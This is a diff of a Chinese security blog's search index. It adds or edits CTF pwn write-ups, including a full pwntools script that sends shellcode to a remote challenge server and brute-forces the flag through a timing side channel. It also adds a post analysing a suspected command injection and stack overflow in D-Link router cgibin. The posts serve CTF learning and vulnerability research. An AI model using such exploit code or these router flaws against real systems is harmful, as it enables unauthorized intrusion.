@@ -5158,7 +5158,8 @@
 <p>虽然系统调用都禁用了，但程序自己将flag读到了v5的位置，因此还是可以使用侧信道爆破的。可以发现程序自己读入了16个字节的shellcode，并将其执行。这就纯纯考的侧信道爆破了，下面就直接放脚本了，毕竟思路啥的上面已经说过了。</p>
 <h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">s = <span class="string">&quot;&#123;&#125;-abcdefghijl01234567898&quot;</span></span><br><span class="line"><span class="built_in">list</span> = [<span class="built_in">ord</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> s]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">add al, 2</span></span><br><span class="line"><span class="string">sal rax, 32</span></span><br><span class="line"><span class="string">mov bl, byte ptr [rax+&#123;&#125;]</span></span><br><span class="line"><span class="string">cmp bl, &#123;&#125;</span></span><br><span class="line"><span class="string">jz $-0x3 </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"><span class="comment"># debug(p,&#x27;pie&#x27;,0xD87)</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28383</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;Your Shellcode &gt;&gt;&#x27;</span>, asm(shellcode.<span class="built_in">format</span>(index, <span class="built_in">list</span>[i])))</span><br><span class="line">        judge = p.recv(timeout=<span class="number">2</span>)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> judge:</span><br><span class="line">            <span class="comment">#log_info(&#x27;success!&#x27;)</span></span><br><span class="line">            flag += <span class="built_in">chr</span>(<span class="built_in">list</span>[i])</span><br><span class="line">            log_info(flag)</span><br><span class="line">            index = index + <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> judge:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            <span class="comment">#log_info(&#x27;wrong!&#x27;)</span></span><br><span class="line">    <span class="comment">#log_info(flag)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;&#125;&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
 
-<p>​					<img src="/../img/image-20220803102650387.png" alt="image-20220803102650387"></p>
+
+
 <h3 id="ctfshow-卷王杯-checkin"><a href="#ctfshow-卷王杯-checkin" class="headerlink" title="ctfshow-卷王杯-checkin"></a>ctfshow-卷王杯-checkin</h3><h4 id="保护策略-1"><a href="#保护策略-1" class="headerlink" title="保护策略"></a>保护策略</h4><p><img src="/../img/image-20220803103106146.png" alt="image-20220803103106146"></p>
 <p><img src="/../img/image-20220803103501444.png" alt="image-20220803103501444"></p>
 <p>这题winmt师傅本意考的是侧信道爆破，但是忘记禁用execve系统调用了哈哈。这里我只记录侧信道爆破的方法。</p>
@@ -5803,7 +5804,7 @@
 
 <p>使用效果：</p>
 <p><img src="/../img/jP81hQByfWJlrTH.png" alt="image-20220729201555971"></p>
-<h3 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h3><p>作用：在脚本中下断点进行调试<br>优点：1、如果使用tmux，可以直接分三屏，效果如下图。您仅仅只需要在脚本中加入这个函数，运行脚本的时候就可以自动分出三块屏幕(调试具体信息占屏幕的右侧，左上是脚本的debug执行信息，左下则可以继续使用)，左下角的区域完全可以去对着脚本进行调试。<br><img src="/../img/7cIP89qwUyT2umG.png"></p>
+<h3 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h3><p>作用：在脚本中下断点进行调试<br>优点：1、如果使用tmux，可以直接分三屏，效果如下图。您仅仅只需要在脚本中加入这个函数，运行脚本的时候就可以自动分出三块屏幕(调试具体信息占屏幕的右侧，左上是脚本的debug执行信息，左下则可以继续使用)，左下角的区域完全可以去对着脚本进行调试。<br><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311122025700.png" alt="image-20231112202529225"></p>
 <p>2、可以很简洁的输入地址，即可完成下断点的工作，同时开了pie保护的话，也可以正常去下断点</p>
 <p>使用说明：<br>        这个函数还是比较常用的，适用于tmux的终端，只需要在最开始传递一下process函数返回的对象，接着就可以直接下断点了（默认使用tmux），如果开启了PIE保护的话，需要声明一下pie（也就是加一个参数’pie’）即可继续下断点。<br>        如果不使用tmux也没问题，可以加入参数no-tmux就可以正常使用这个函数（<strong>如果使用no-tmux，则这个参数必须是放在第二个参数的位置</strong>（第一个参数始终是process的返回值）</p>
 <p>如果直接使用debug()函数，参数只有process函数返回的对象的话，则默认使用tmux终端，执行分三屏命令，最后执行gdb.attach(p)<br>PS：这个函数可以放到脚本的任何位置（必须要保证当前位置的下面还有一行不会触发报错的代码），这样可以从脚本当前的位置去开始调试，同时配合下的断点可以使调试更高效。<br>使用范例：</p>
@@ -7256,6 +7257,36 @@
       <tags>
         <tag>栈迁移</tag>
       </tags>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/posts/0.html</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>事情的起因是想去复现一下 <code>D-Link DIR-825</code> 、 <code>TRENDnet TEW-632BRP</code> 命令注入漏洞 （<code>CVE-2020-10216</code> ）。因为一直没找到命令注入的点，一时兴起，就随便看了看 <code>DIR-825</code> 固件中的 <code>cgibin</code> 。大致看了一下后，又想着下载一个型号相近的看看 <code>cgibin</code> 里有没有什么漏洞（我希望在不看漏洞披露信息的情况下，寻找一些比较明显的漏洞）</p>
+<p>果然，经过简单的分析。我发现了一处疑似命令注入漏洞和一处疑似栈溢出漏洞的地方</p>
+<h2 id="疑似的命令注入？"><a href="#疑似的命令注入？" class="headerlink" title="疑似的命令注入？"></a>疑似的命令注入？</h2><p>位于 <code>soapcgi_main</code> 函数中，这里 <code>REQUEST_URI</code> 内容给到了 <code>v3</code> 后续判断是否有 <code>?service=</code> ，做了简单的过滤后最终可以命令执行</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311081803589.png" alt="image-20231108180343514"></p>
+<h2 id="疑似的栈溢出？"><a href="#疑似的栈溢出？" class="headerlink" title="疑似的栈溢出？"></a>疑似的栈溢出？</h2><p>位于 <code>sessioncgi_main</code> 函数这里 <code>REQUEST_URI</code> 无论匹配到的是 <code>form_login</code> 还是 <code>form_logout</code> 都可以触发 <code>weblogin_log</code> 函数</p>
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311081803502.png" alt="image-20231108180318418" style="zoom:50%;" />
+
+
+
+<p>可以发现 <code>weblogin_log</code> 函数的第二个参数（也就是 <code>getenv(&quot;REMOTE_ADDR&quot;)</code> 的值 ）与 <code>::ffff:</code> 做对比，如果检查通过则执行 <code>strcpy</code> 函数进行拷贝。如果 <code>REMOTE_ADDR</code> 的值可控，在拷贝时就会造成栈溢出</p>
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311081825805.png" alt="image-20231108182521717" style="zoom:50%;" />
+
+
+
+
+
+<p>因为我感觉这两个漏洞都很浅，这种很多年前的设备都被无数人光临过了，大概率已经有了漏洞相关信息。但是一番搜索下来只看到了第一个命令注入漏洞被发现过了，第二个栈溢出，并没有人提到过。</p>
+<p>于是我先是用 <code>qemu</code> 用户级仿真了一下，发现如果 <code>REMOTE_ADDR</code> 确实可控的话，在漏洞函数返回时的地址会被破坏，导致程序崩溃。</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311081924910.png" alt="image-20231108192425522"></p>
+<p>咸鱼上淘了一个二手的 <code>DIR-850L</code> 真机，我打了一下发现响应包是正常的，返回了 <code>ok</code>。</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311081930234.png" alt="image-20231108193051156"></p>
+<p> 返回 <code>ok</code> 就意味着下图中的 <code>printf</code> 已经正常执行了，这说明 <code>weblogin_log</code> 函数正常返回，并没有栈溢出导致崩溃。</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311081932595.png" alt="image-20231108193255552"></p>
+<p>于是乎开始各种排查，我开始的重心一直在排查报文编写错误。<code>REMOTE_ADDR</code> 的值没有添加双引号？<code>GET</code> 方式试一下？溢出的字节不够多？ 还有什么字段也要伪造，没注意到？还是已经崩溃了，只不过<code>WEB</code> 界面没看到效果？</p>
+<p>反正我当时抛出了很多疑问，然后一一进行了排除和验证。</p>
+]]></content>
   </entry>
   <entry>
     <title>虎符CTF2022 babygame</title>
